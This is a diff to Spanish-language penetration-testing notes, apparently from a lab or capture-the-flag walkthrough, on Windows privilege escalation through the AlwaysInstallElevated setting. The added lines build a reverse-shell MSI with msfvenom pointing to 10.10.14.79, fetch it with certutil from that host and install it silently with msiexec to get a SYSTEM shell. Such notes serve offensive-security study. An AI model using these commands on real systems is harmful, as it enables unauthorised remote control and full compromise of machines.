@@ -113,6 +113,19 @@ Lo que nos permite tener estos dos registros activados es que se le permite al u
 
 Nos vamos a crear un fichero `.msi` usando [[MSFVENOM]] utilizando
 ```shell
-msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 -f msi -o reverse.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.79 LPORT=445 --platform windows -a x64 -f msi -o reverse.msi
 ```
+
+Nos lo compartiremos a la maquina Windows
+```shell
+certutil.exe -f -urlcache -split http://10.10.14.79/reverse.msi
+```
+
+
+Nos ponemos en escucha en el puerto configurado, e instalamos el archivo `.msi`
+```shell
+msiexec /quiet /qn /i reverse.msi
+```
+
+Obteniendo así una shell como `NT AUTHORITY\SYSTEM`
 
